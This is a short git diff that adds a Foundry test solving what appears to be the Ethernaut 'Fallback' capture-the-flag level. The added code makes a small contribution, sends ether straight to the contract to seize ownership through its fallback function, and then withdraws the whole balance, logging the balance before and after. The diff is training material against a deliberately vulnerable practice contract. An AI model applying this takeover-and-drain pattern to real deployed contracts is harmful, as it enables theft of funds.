@@ -17,5 +17,20 @@ contract FallbackLevel is SetUpLevelTest {
         fback = Fallback(payable(instance));
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        emit log_named_uint(
+            "fback balance before exploit",
+            address(fback).balance
+        );
+        fback.contribute{value: 0.0001 ether}();
+        (bool success, ) = address(fback).call{value: 0.0001 ether}("");
+        assert(success);
+        assert(fback.owner() == player);
+        fback.withdraw();
+        emit log_named_uint(
+            "fback balance after exploit",
+            address(fback).balance
+        );
+        vm.stopPrank();
     }
 }
